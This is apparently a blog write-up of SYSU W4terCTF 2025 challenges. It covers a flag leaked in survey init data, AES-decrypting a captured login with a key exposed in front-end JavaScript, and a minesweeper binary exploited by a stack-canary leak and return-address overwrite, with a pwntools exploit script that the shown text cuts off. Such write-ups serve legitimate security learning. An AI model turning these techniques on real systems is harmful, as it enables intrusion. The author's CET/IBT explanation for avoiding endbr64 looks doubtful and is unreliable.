    <id>http://example.com/2025/04/28/SYSU%20W4terCTF%202025/</id>
    <published>2025-04-28T04:48:37.447Z</published>
    <updated>2025-05-05T12:03:10.967Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>Hack for fun not for profit_</p></blockquote><p>以下是我在 Team Nooob 队伍中负责的题目。</p><h1 id="签到问卷"><a class="markdownIt-Anchor" href="#签到问卷"></a> 签到问卷</h1><p>周一12点开赛，下午边上课边做，拿下队伍首血 😃</p><p>这道题把 flag 硬编码或直接包含在客户端可以获取的初始化数据中。虽然题面描述了截止时间错误和提交后提示语，看起来像是需要完成提交或绕过时间检查，但实际上，Flag 并没有被动态生成或在提交后才从服务器返回。</p><p>真正的解题路径是：</p><ul><li><strong>识别</strong> 页面加载时获取的关键初始化数据（通常在 script 标签或通过 AJAX 请求获取）。</li><li><strong>解码</strong> 数据（如果被编码）。</li><li><strong>分析</strong> 解码后的数据结构，寻找与问卷状态、流程控制或结束/成功提示相关的字段。</li><li><strong>直接</strong> 在相关的字段值中查找 Flag。</li></ul><p><code>end_of_survey</code> 字段恰好就承担了“问卷结束时显示的提示语”的角色，并且 LilRan “不小心”将 Flag 直接放到了这里，而<strong>不是在触发显示后才动态加载或生成</strong>。因此，绕过提交或时间检查的复杂步骤变得不必要，Flag <strong>直接通过分析页面初始化数据</strong>就获取到了。<br><img src="/2025/04/28/SYSU%20W4terCTF%202025/survey.png" alt="survey.png"></p><h1 id="管理员的密码"><a class="markdownIt-Anchor" href="#管理员的密码"></a> 管理员的密码</h1><p>WireShark分析流量包中用户登录成功的报文，找到加密后的密码：<br><img src="/2025/04/28/SYSU%20W4terCTF%202025/shark.png" alt="shark.png"></p><p>前端<code>CD3Iylek.js</code>中显示了加密算法 AES 与加密模式：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ...</span></span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">           <span class="keyword">const</span> o = <span class="keyword">new</span> <span class="title class_">Date</span></span><br><span class="line">             , h = <span class="string">`<span class="subst">$&#123;o.getFullYear()&#125;</span>:<span class="subst">$&#123;o.getMonth() + <span class="number">1</span>&#125;</span>:<span class="subst">$&#123;o.getDate()&#125;</span>:<span class="subst">$&#123;o.getHours()&#125;</span>:<span class="subst">$&#123;o.getMinutes()&#125;</span>#`</span></span><br><span class="line">             , t = h0.<span class="property">enc</span>.<span class="property">Hex</span>.<span class="title function_">parse</span>(<span class="string">&quot;4ede70b7e44ffcc7cd912685defd05b1&quot;</span>)</span><br><span class="line">             , a = h0.<span class="property">enc</span>.<span class="property">Hex</span>.<span class="title function_">parse</span>(<span class="string">&quot;c63b909a63ecdbbe813181e3c4734d87&quot;</span>)</span><br><span class="line">             , f = h0.<span class="property">AES</span>.<span class="title function_">encrypt</span>(h + l, t, &#123;</span><br><span class="line">               <span class="attr">iv</span>: a,</span><br><span class="line">               <span class="attr">mode</span>: h0.<span class="property">mode</span>.<span class="property">CBC</span>,</span><br><span class="line">               <span class="attr">padding</span>: h0.<span class="property">pad</span>.<span class="property">Pkcs7</span></span><br><span class="line">           &#125;).<span class="title function_">toString</span>();</span><br><span class="line">           <span class="keyword">await</span> kx.<span class="property">account</span>.<span class="title function_">accountLoginCreate</span>(&#123;</span><br><span class="line">               <span class="attr">userName</span>: R,</span><br><span class="line">               <span class="attr">password</span>: f</span><br><span class="line">           &#125;),</span><br><span class="line">   <span class="comment">// ....</span></span><br></pre></td></tr></table></figure><ol><li>首先获取当前的日期和时间（年、月、日、时、分），并格式化成 <code>YYYY:M:D:H:M#</code> 的字符串（存储在变量 <code>h</code> 中）。</li><li>定义了两个十六进制字符串 <code>&quot;4ede70b7e44ffcc7cd912685defd05b1&quot;</code> 和 <code>&quot;c63b909a63ecdbbe813181e3c4734d87&quot;</code>，并将它们解析成字节数组。这很明显是 AES 加密的 <strong>密钥 (Key)</strong> 和 <strong>初始化向量 (IV)</strong>。</li><li>将前面生成的时间字符串 <code>h</code> 与另一个变量 <code>l</code> 拼接起来。根据上下文和通常的登录逻辑，这个 <code>l</code> 就是用户在密码输入框中输入的 <strong>原始密码</strong>。</li><li>使用 <code>h0.AES.encrypt</code> 方法对拼接后的 <code>h + l</code> 字符串进行 AES 加密。加密配置使用了 <code>t</code> 作为密钥，<code>a</code> 作为 IV，加密模式是 <strong>CBC (Cipher Block Chaining)</strong>，填充方式是 <strong>Pkcs7</strong>。</li><li>加密结果 <code>.toString()</code> 转换成 Base64 字符串。这个结果存储在变量 <code>f</code> 中。</li><li>最后，将 <code>f</code> 作为 <code>password</code> 参数发送给 <code>accountLoginCreate</code> 接口。</li></ol><p>而从流量包中抓到的<code>gBjV3cE/UXEm7fXGXbQ4Ox00P0zOdz0LgVaTt5iTrNhaPX81IWdsVWEA1r56LkGobiHaOvhswbVxMUypSZpWpfiGNe5wXcDbl1JuFEZDC4A=</code> 就是这个经过 <strong>时间拼接、AES 加密、Base64 编码</strong> 后的 <code>f</code> 变量的值！</p><p>所以过程将是：Base64 解码 --&gt; AES 解密 --&gt; 提取密码 <code>YYYY:M:D:H:M#原始密码</code>！</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.Padding <span class="keyword">import</span> unpad</span><br><span class="line"><span class="keyword">from</span> binascii <span class="keyword">import</span> unhexlify</span><br><span class="line"></span><br><span class="line">encrypted_b64 = <span class="string">&quot;gBjV3cE/UXEm7fXGXbQ4Ox00P0zOdz0LgVaTt5iTrNhaPX81IWdsVWEA1r56LkGobiHaOvhswbVxMUypSZpWpfiGNe5wXcDbl1JuFEZDC4A=&quot;</span></span><br><span class="line">key_hex = <span class="string">&quot;4ede70b7e44ffcc7cd912685defd05b1&quot;</span></span><br><span class="line">iv_hex = <span class="string">&quot;c63b909a63ecdbbe813181e3c4734d87&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 1. Base64 解码</span></span><br><span class="line">encrypted_data = base64.b64decode(encrypted_b64)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 将 Hex 格式的 Key 和 IV 转换为字节串</span></span><br><span class="line">key = unhexlify(key_hex)</span><br><span class="line">iv = unhexlify(iv_hex)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 2. AES 解密</span></span><br><span class="line"><span class="comment"># 创建 AES 解密器对象</span></span><br><span class="line">cipher = AES.new(key, AES.MODE_CBC, iv)</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"><span class="comment"># 解密，并进行 PKCS7 填充移除</span></span><br><span class="line">decrypted_padded_data = cipher.decrypt(encrypted_data)</span><br><span class="line">decrypted_data = unpad(decrypted_padded_data, AES.block_size)</span><br><span class="line">  </span><br><span class="line"><span class="comment"># 将解密后的字节串转换为字符串</span></span><br><span class="line">decrypted_string = decrypted_data.decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 3. 提取密码</span></span><br><span class="line"><span class="keyword">if</span> <span class="string">&#x27;#&#x27;</span> <span class="keyword">in</span> decrypted_string:</span><br><span class="line">    original_password = decrypted_string.split(<span class="string">&#x27;#&#x27;</span>, <span class="number">1</span>)[<span class="number">1</span>]</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;成功解密出的原始密码 (Flag): <span class="subst">&#123;original_password&#125;</span>&quot;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;解密后的数据格式不正确，未找到 &#x27;#&#x27; 分隔符。&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;解密后的数据: <span class="subst">&#123;decrypted_string&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure><p><img src="/2025/04/28/SYSU%20W4terCTF%202025/passwd.png" alt="passwd.png"></p><h1 id="wmc25-d0"><a class="markdownIt-Anchor" href="#wmc25-d0"></a> WMC25 D0</h1><p>原本以为要用栈溢出来 call <code>win</code>，没想到玩完扫雷就给了。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">win</span><span class="params">()</span> &#123; system(<span class="string">&quot;/bin/sh&quot;</span>); &#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">vuln</span><span class="params">()</span> &#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">16</span>] = &#123;&#125;;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;You win! Please sign your name: &quot;</span>);</span><br><span class="line">  <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">    read(<span class="number">0</span>, buf, <span class="number">0x408</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\nLeaderboard\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;01 %16s ... %ds\n\n&quot;</span>, buf, last);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">strlen</span>(buf) &gt; <span class="number">16</span>) &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;Your name is too long, which will break our award ceremony!\n&quot;</span>);</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;Just give us another shorter nickname: &quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span></span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Thanks for playing my game.\n&quot;</span>);</span><br><span class="line">  win();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2025/04/28/SYSU%20W4terCTF%202025/wmc.png" alt="wmc.png"></p><h1 id="wmc25-d1"><a class="markdownIt-Anchor" href="#wmc25-d1"></a> WMC25 D1</h1><p>下一 level 就把 <code>win()</code> 给去掉了，我们现在需要进行栈溢出覆盖返回地址。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">win</span><span class="params">()</span> &#123; system(<span class="string">&quot;/bin/sh&quot;</span>); &#125;      <span class="comment">// 后门函数</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">vuln</span><span class="params">()</span> &#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">16</span>] = &#123;&#125;;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;You win! Please sign your name: &quot;</span>);</span><br><span class="line">  <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">    read(<span class="number">0</span>, buf, <span class="number">0x408</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\nLeaderboard\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;01 %16s ... %ds\n\n&quot;</span>, buf, last);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">strlen</span>(buf) &gt; <span class="number">16</span>) &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;Your name is too long, which will break our award ceremony!\n&quot;</span>);</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;Just give us another shorter nickname: &quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span></span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Thanks for playing my game.\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>同时通过 <code>checksec</code> 知道程序<strong>开启了 Canary 栈保护</strong>。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ checksec --file=./pwn</span><br><span class="line">RELRO            tifiable</span><br><span class="line">STACK CANARY     Canary found</span><br><span class="line">NX               NX enabled</span><br><span class="line">PIE              No PIE</span><br><span class="line">RPATH            No RPATH</span><br></pre></td></tr></table></figure><p>为了覆盖返回地址为找到的后门函数 <code>win</code> ，我们一定会覆盖掉 Canary，但是如果 Canary 被破坏了的话，返回时检查就会跳到 <code>__stack_chk_fail</code>，直接 stack smashing。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">40139e:48 8b 45 f8          mov    -0x8(%rbp),%rax</span><br><span class="line">4013a2:64 48 2b 04 25 28 00 sub    %fs:0x28,%rax</span><br><span class="line">4013a9:00 00 </span><br><span class="line">4013ab:74 05                je     4013b2 &lt;vuln+0xe2&gt;</span><br><span class="line">4013ad:e8 8e fd ff ff       call   401140 &lt;__stack_chk_fail@plt&gt;</span><br></pre></td></tr></table></figure><p>因此我们需要设计好两次payload：</p><ol><li>第一次提交24字节的payload（16 bytes buf + 8 bytes padding），泄露 <strong>Canary</strong> 值：无论是通过 <code>pwntools</code> 的 <code>sendline</code> 发送还是手动 stdin 输入，最后一个换行符 <code>\n</code> 都会被记录！而恰好这个换行符可以覆盖金丝雀的最低字节 <code>\x00</code>，因此我们需要读取输出后的七个字节。<img src="/2025/04/28/SYSU%20W4terCTF%202025/d1_canary.png" alt="d1_canary.png"></li><li>第二次在 payload 中填上我们的 Canary，在 <code>$rbp+8</code> 开始的8字节返回地址覆盖上 <code>win()</code> 的入口地址，尝试得到 shell。一开始我覆盖的是 <code>win</code> 函数的入口地址 <code>0x4012b6</code> ，执行指令 <code>endbr64</code> 会出错，只好跳到下一条指令 <code>0x4012ba</code>。</li></ol><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">00000000004012b</span>6 &lt;win&gt;:</span><br><span class="line">  <span class="number">4012b</span>6:f3 <span class="number">0f</span> <span class="number">1</span>e fa          endbr64 </span><br><span class="line">  <span class="number">4012b</span>a:<span class="number">55</span>                   push   %rbp</span><br><span class="line">  <span class="number">4012b</span>b:<span class="number">48</span> <span class="number">89</span> e5             mov    %rsp,%rbp</span><br><span class="line">  <span class="number">4012b</span>e:<span class="number">48</span> <span class="number">8</span>d <span class="number">05</span> <span class="number">4b</span> <span class="number">0</span>d <span class="number">00</span> <span class="number">00</span> lea    <span class="number">0xd4b</span>(%rip),%rax        # <span class="number">402010</span> &lt;_IO_stdin_used+<span class="number">0x10</span>&gt;</span><br><span class="line">  <span class="number">4012</span>c5:<span class="number">48</span> <span class="number">89</span> c7             mov    %rax,%rdi</span><br><span class="line">  <span class="number">4012</span>c8:e8 <span class="number">83</span> fe ff ff       call   <span class="number">401150</span> &lt;system@plt&gt;</span><br><span class="line">  <span class="number">4012</span>cd:<span class="number">90</span>                   nop</span><br><span class="line">  <span class="number">4012</span>ce:<span class="number">5</span>d                   pop    %rbp</span><br><span class="line">  <span class="number">4012</span>cf:c3                   ret    </span><br></pre></td></tr></table></figure><blockquote><p>那么为什么无法直接跳到 <code>endbr64</code>？</p></blockquote><p>这是因为<code>endbr64</code> 不是任意可执行的指令，<strong>要成功执行 <code>endbr64</code>，系统必须启用了 CET/IBT 且该指令出现在合法的间接跳转目标处</strong>，否则会产生 <strong>#CP (Control Protection Exception)</strong>。IBT (Indirect Branch Tracking) 机制只允许这两类跳转到 <code>endbr64</code>:</p><ul><li><code>jmp reg</code> ：直接从寄存器跳转，比如 <code>jmp rax</code></li><li><code>call reg</code> ：间接调用，比如 <code>call rbx</code><br>这两种跳转被 IBT 标记为“合法的<strong>间接跳转入口检查</strong>” ，由于 <code>ret</code> 本质上是 <code>pop rip</code>，所以直接被 CET IBT 给拦截了。<br><img src="/2025/04/28/SYSU%20W4terCTF%202025/d1_flag.png" alt="d1_flag.png"></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># exploit.py</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">HOST = <span class="string">&#x27;localhost&#x27;</span></span><br><span class="line">PORT = &lt;port&gt;</span><br><span class="line">  </span><br><span class="line"><span class="comment"># win 函数的地址</span></span><br><span class="line">WIN_ADDRESS = <span class="number">0x00000000004012be</span></span><br><span class="line">  </span><br><span class="line"><span class="comment"># vuln 函数中 buf 到返回地址的偏移量</span></span><br><span class="line"><span class="comment"># 16 bytes buf + 8 bytes padding + 8 bytes canary + 8 bytes saved RBP = 40 bytes</span></span><br><span class="line">PAYLOAD_OFFSET = <span class="number">40</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Offset from the start of buf to the canary</span></span><br><span class="line"><span class="comment"># 16 bytes buf + 8 bytes padding = 24 bytes</span></span><br><span class="line">CANARY_OFFSET_FROM_BUF = <span class="number">24</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">solve_minesweeper</span>(<span class="params">r</span>):</span><br><span class="line">    log.info(<span class="string">&quot;开始解决扫雷游戏...&quot;</span>)</span><br><span class="line">    <span class="comment">#....</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 等待胜利提示符，进入 vuln 函数</span></span><br><span class="line">    r.recvuntil(<span class="string">b&quot;You win! Please sign your name: &quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_canary_and_exploit</span>(<span class="params">r</span>):</span><br><span class="line">    log.info(<span class="string">&quot;进入漏洞利用阶段...&quot;</span>)</span><br><span class="line">    <span class="comment"># sendline 会自动添加换行符，覆盖金丝雀第一个字节 (\x00)</span></span><br><span class="line">    leak_padding_size = CANARY_OFFSET_FROM_BUF <span class="comment"># 24 bytes padding</span></span><br><span class="line">    leak_payload = <span class="string">b&#x27;A&#x27;</span> * leak_padding_size</span><br><span class="line"></span><br><span class="line">    log.info(<span class="string">f&quot;发送泄露 payload (长度: <span class="subst">&#123;<span class="built_in">len</span>(leak_payload)&#125;</span>)...&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 发送泄露 payload</span></span><br><span class="line">    r.sendline(leak_payload)</span><br><span class="line">    log.debug(<span class="string">&quot;泄露 payload 已发送。等待 Leaderboard...&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 接收包含金丝雀的输出行</span></span><br><span class="line">    log.info(<span class="string">&quot;接收输出以泄露金丝雀...&quot;</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        r.recvuntil(<span class="string">b&#x27;Leaderboard\n&#x27;</span>)</span><br><span class="line">        log.debug(<span class="string">&quot;接收到 Leaderboard 标记。准备接收泄露行...&quot;</span>)</span><br><span class="line">        <span class="comment"># 尝试接收包含填充的那一行，然后接收下一行（包含金丝雀）</span></span><br><span class="line">        padding_line = r.recvline() <span class="comment"># 接收打印填充和换行符的那一行</span></span><br><span class="line">        log.debug(<span class="string">f&quot;接收到填充行: <span class="subst">&#123;padding_line&#125;</span>&quot;</span>)</span><br><span class="line">        canary_line = r.recvline() <span class="comment"># 接收打印金丝雀开始的那一行</span></span><br><span class="line">        log.info(<span class="string">f&quot;接收到的金丝雀行: <span class="subst">&#123;canary_line&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 从金丝雀行中解析金丝雀的后 7 个字节</span></span><br><span class="line">        canary_7_bytes = canary_line[:<span class="number">7</span>] <span class="comment"># 提取前 7 个字节</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># 重构完整的 8 字节金丝雀： \x00 + 后 7 个字节</span></span><br><span class="line">        canary_value_bytes = <span class="string">b&#x27;\x00&#x27;</span> + canary_7_bytes</span><br><span class="line"></span><br><span class="line">        log.success(<span class="string">f&quot;成功提取金丝雀（重构前 7 字节）: <span class="subst">&#123;canary_7_bytes&#125;</span>&quot;</span>)</span><br><span class="line">        log.success(<span class="string">f&quot;重构完整的金丝雀: <span class="subst">&#123;canary_value_bytes&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(canary_value_bytes) != <span class="number">8</span>:</span><br><span class="line">             log.warning(<span class="string">f&quot;重构后的金丝雀长度不是 8 (<span class="subst">&#123;<span class="built_in">len</span>(canary_value_bytes)&#125;</span>)，可能提取错误或金丝雀结构不同。&quot;</span>)</span><br><span class="line">             log.info(<span class="string">f&quot;金丝雀行所有字节 (hex): <span class="subst">&#123;canary_line.<span class="built_in">hex</span>()&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">except</span> EOFError:</span><br><span class="line">         log.error(<span class="string">&quot;连接在泄露阶段关闭，请调试。&quot;</span>)</span><br><span class="line">         log.error(<span class="string">&quot;可能泄露 payload 导致程序立即崩溃。&quot;</span>)</span><br><span class="line">         <span class="keyword">return</span></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">         log.error(<span class="string">f&quot;解析输出时发生错误: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line">         <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># --- 构造并发送第二次 exploit payload ---</span></span><br><span class="line">    log.info(<span class="string">&quot;等待下一轮输入提示符...&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        r.recvuntil(<span class="string">b&quot;Just give us another shorter nickname: &quot;</span>)</span><br><span class="line">        log.info(<span class="string">&quot;接收到提示符。准备发送 exploit payload...&quot;</span>)</span><br><span class="line">    <span class="keyword">except</span> EOFError:</span><br><span class="line">        log.error(<span class="string">&quot;连接在接收下一轮输入提示符时关闭，请调试。&quot;</span>)</span><br><span class="line">        log.error(<span class="string">&quot;可能程序在等待输入前崩溃。&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 填充 (到达金丝雀位置前): buf 16 bytes + padding 8 bytes = 24 bytes</span></span><br><span class="line">    padding_before_canary = <span class="string">b&#x27;A&#x27;</span> * <span class="number">15</span> + <span class="string">b&#x27;\0&#x27;</span> + <span class="string">b&#x27;C&#x27;</span> * <span class="number">8</span></span><br><span class="line"></span><br><span class="line">    padding_after_canary = <span class="string">b&#x27;B&#x27;</span> * (PAYLOAD_OFFSET - CANARY_OFFSET_FROM_BUF - <span class="number">8</span>)</span><br><span class="line">    <span class="comment"># win 函数地址 (8 字节小端序)</span></span><br><span class="line">    win_address_bytes = p64(WIN_ADDRESS)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 最终 payload = 填充 + 金丝雀 + RBP 填充 + 返回地址</span></span><br><span class="line">    exploit_payload = padding_before_canary + canary_value_bytes + padding_after_canary + win_address_bytes</span><br><span class="line">  </span><br><span class="line">    log.info(<span class="string">f&quot;发送 exploit payload (长度: <span class="subst">&#123;<span class="built_in">len</span>(exploit_payload)&#125;</span>)...&quot;</span>)</span><br><span class="line">    r.sendline(exploit_payload) <span class="comment"># 使用 sendline 发送最终 payload</span></span><br><span class="line">    log.debug(<span class="string">&quot;Exploit payload 已发送。&quot;</span>)</span><br><span class="line">    log.info(<span class="string">&quot;Payload 已发送。尝试与 shell 交互...&quot;</span>)</span><br><span class="line">    log.debug(<span class="string">&quot;Exploit payload 已发送。&quot;</span>)</span><br><span class="line"></span><br><span class="line">    r.recvuntil(<span class="string">b&quot;Thanks for playing my game.\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">    r.interactive()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 主程序入口</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    context.update(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line">    context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">  </span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        conn = remote(HOST, PORT)</span><br><span class="line">        log.info(<span class="string">f&quot;成功连接到 <span class="subst">&#123;HOST&#125;</span>:<span class="subst">&#123;PORT&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        log.error(<span class="string">f&quot;连接到 <span class="subst">&#123;HOST&#125;</span>:<span class="subst">&#123;PORT&#125;</span> 失败: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line">     